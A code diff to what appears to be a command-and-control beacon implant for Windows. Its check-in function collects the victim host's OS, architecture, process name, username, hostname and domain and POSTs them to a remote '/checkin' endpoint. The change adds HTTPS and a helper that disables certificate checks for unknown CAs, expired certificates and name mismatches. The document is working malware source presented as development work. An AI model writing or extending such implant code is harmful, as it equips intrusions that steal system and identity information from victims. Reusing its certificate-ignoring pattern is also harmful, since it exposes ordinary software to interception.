@@ -5,6 +5,13 @@ static void wchar_to_utf8(const wchar_t *src, char *dst, int dst_size) {
     WideCharToMultiByte(CP_UTF8, 0, src, -1, dst, dst_size, NULL, NULL);
 }
 
+static void tls_ignore(HINTERNET hReq) {
+    DWORD flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA    |
+                  SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
+                  SECURITY_FLAG_IGNORE_CERT_CN_INVALID;
+    WinHttpSetOption(hReq, WINHTTP_OPTION_SECURITY_FLAGS, &flags, sizeof(flags));
+}
+
 void beacon_checkin(BEACON_CTX *ctx) {
     char os_ver[128], arch[16], proc_name[260], uname[256], hname[256], dom[256];
     wchar_to_utf8(ctx->os_version,   os_ver,    sizeof(os_ver));
@@ -46,8 +53,11 @@ void beacon_checkin(BEACON_CTX *ctx) {
 
     HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", L"/checkin",
                                              NULL, WINHTTP_NO_REFERER,
-                                             WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
+                                             WINHTTP_DEFAULT_ACCEPT_TYPES,
+                                             WINHTTP_FLAG_SECURE);
     if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return; }
+
+    tls_ignore(hRequest);
 
     DWORD json_len = (DWORD)strlen(json);
     WinHttpSendRequest(hRequest, L"Content-Type: application/json\r\n",
